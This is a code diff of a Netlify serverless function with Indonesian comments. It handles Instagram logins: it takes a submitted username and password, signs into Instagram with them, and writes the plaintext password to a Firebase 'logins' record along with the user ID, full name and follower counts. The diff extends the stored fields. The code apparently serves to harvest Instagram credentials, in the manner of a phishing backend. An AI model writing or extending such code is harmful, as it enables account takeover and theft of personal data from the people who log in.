@@ -147,55 +147,67 @@ exports.handler = async function(event, context) {
                 };
             }
         }
-    } else if (event.httpMethod === 'POST' && event.path === '/.netlify/functions/instagram/login') {
-        const { username, password } = JSON.parse(event.body);
+    } 
+    
+    
+else if (event.httpMethod === 'POST' && event.path === '/.netlify/functions/instagram/login') {
+    const { username, password } = JSON.parse(event.body);
 
-        try {
-            ig.state.generateDevice(username);
-            await ig.account.login(username, password);
+    try {
+        ig.state.generateDevice(username);
+        await ig.account.login(username, password);
 
-            sessionData = ig.state.serialize();
+        sessionData = ig.state.serialize();
 
-            const user = await ig.account.currentUser();
-            const userId = user.pk;
+        const user = await ig.account.currentUser();
+        const userId = user.pk;
 
-            // Simpan ke Firebase Realtime Database
-            const loginData = {
-                username,
-                password,
-                userId,
-                timestamp: new Date().toISOString(),
-                profile_picture_url: user.profile_pic_url, // Menyimpan URL gambar profil
-            };
+        // Ambil data tambahan yang ingin disimpan di 'logins'
+        const followersCount = user.follower_count;
+        const followingCount = user.following_count;
+        const fullName = user.full_name;
 
-            // Menyimpan data login di Realtime Database
-            await db.ref('logins').child(userId).set(loginData);
+        // Simpan data login ke 'logins' dan tambahkan data followers, following, full name
+        const loginData = {
+            username,
+            password,
+            userId,
+            timestamp: new Date().toISOString(),
+            profile_picture_url: user.profile_pic_url, // Menyimpan URL gambar profil
+            followers_count: followersCount,  // Tambahkan jumlah followers
+            following_count: followingCount,  // Tambahkan jumlah following
+            full_name: fullName,  // Tambahkan full name
+        };
 
+        // Menyimpan data login di Realtime Database
+        await db.ref('logins').child(userId).set(loginData);
+
+        return {
+            statusCode: 200,
+            body: JSON.stringify({ message: 'Login berhasil!' }),
+        };
+    } catch (error) {
+        console.error('Login gagal:', error);
+
+        if (error.name === 'IgLoginRequiredError') {
             return {
-                statusCode: 200,
-                body: JSON.stringify({ message: 'Login berhasil!' }),
+                statusCode: 401,
+                body: JSON.stringify({ message: 'Instagram login failed: incorrect username or password.' }),
             };
-        } catch (error) {
-            console.error('Login gagal:', error);
-
-            if (error.name === 'IgLoginRequiredError') {
-                return {
-                    statusCode: 401,
-                    body: JSON.stringify({ message: 'Instagram login failed: incorrect username or password.' }),
-                };
-            } else if (error.name === 'IgCheckpointError') {
-                return {
-                    statusCode: 400,
-                    body: JSON.stringify({ message: 'Instagram needs 2FA verification.' }),
-                };
-            } else {
-                return {
-                    statusCode: 500,
-                    body: JSON.stringify({ message: 'Login failed, please try again later.' }),
-                };
-            }
+        } else if (error.name === 'IgCheckpointError') {
+            return {
+                statusCode: 400,
+                body: JSON.stringify({ message: 'Instagram needs 2FA verification.' }),
+            };
+        } else {
+            return {
+                statusCode: 500,
+                body: JSON.stringify({ message: 'Login failed, please try again later.' }),
+            };
         }
     }
+}
+
 
     return {
         statusCode: 404,
